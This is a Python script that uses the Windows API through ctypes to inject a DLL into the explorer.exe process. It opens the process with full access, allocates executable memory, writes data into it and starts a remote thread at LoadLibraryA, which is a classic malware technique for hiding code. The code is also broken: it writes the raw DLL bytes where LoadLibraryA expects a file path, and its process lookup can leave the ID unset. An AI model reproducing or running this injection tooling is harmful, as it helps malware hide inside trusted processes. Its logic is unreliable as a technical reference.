import ctypes  # For interacting with the Windows API
import psutil  # For retrieving process information
import os

# Specify the path to the DLL file
dll_path = "path/to/injrcted.dll"

# Load the DLL file
with open(dll_path, "rb") as f:
    dll_data = f.read()

# Get the process ID of the explorer.exe process
for proc in psutil.process_iter():
    if proc.name() == "explorer.exe":
        pid = proc.pid
        break

# Open a handle to the explorer.exe process
handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)

if not handle:
    print("Failed to open process.")
    exit(1)

# Allocate memory in the process
memory = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll_data), 0x1000, 0x40)

if not memory:
    print("Failed to allocate memory.")
    ctypes.windll.kernel32.CloseHandle(handle)
    exit(1)

# Write the DLL file to the allocated memory
written = ctypes.c_ulong(0)
result = ctypes.windll.kernel32.WriteProcessMemory(handle, memory, dll_data, len(dll_data), ctypes.byref(written))

if not result or written.value != len(dll_data):
    print("Failed to write to process memory.")
    ctypes.windll.kernel32.VirtualFreeEx(handle, memory, 0, 0x8000)  # Free the allocated memory
    ctypes.windll.kernel32.CloseHandle(handle)
    exit(1)

# Get the address of the LoadLibraryA function from kernel32.dll
kernel32 = ctypes.windll.kernel32
load_library_address = kernel32.GetProcAddress(kernel32.GetModuleHandleA("kernel32.dll"), b"LoadLibraryA")

if not load_library_address:
    print("Failed to get address of LoadLibraryA.")
    ctypes.windll.kernel32.VirtualFreeEx(handle, memory, 0, 0x8000)  # Free the allocated memory
    ctypes.windll.kernel32.CloseHandle(handle)
    exit(1)

# Create a remote thread in the process to execute the DLL
thread_id = ctypes.c_ulong(0)
result = ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, load_library_address, memory, 0, ctypes.byref(thread_id))

if not result:
    print("Failed to create remote thread.")
    ctypes.windll.kernel32.VirtualFreeEx(handle, memory, 0, 0x8000)  # Free the allocated memory
    ctypes.windll.kernel32.CloseHandle(handle)
    exit(1)

print("DLL injected successfully.")
ctypes.windll.kernel32.CloseHandle(handle)
